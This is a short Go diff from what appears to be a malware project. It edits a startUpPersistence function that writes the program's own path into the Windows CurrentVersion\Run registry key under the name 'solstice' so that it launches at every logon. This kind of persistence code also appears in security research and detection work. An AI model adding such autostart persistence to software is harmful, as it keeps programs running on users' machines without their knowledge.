@@ -111,9 +111,7 @@ func schtaskPersistence() error {
 
 func startUpPersistence() error {
 	path := os.Args[0] //, er := GetName()
-	if er != nil {
-		log.Println(er)
-	}
+
 	err := WriteRegistryKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, "solstice", path)
 	return err
 }
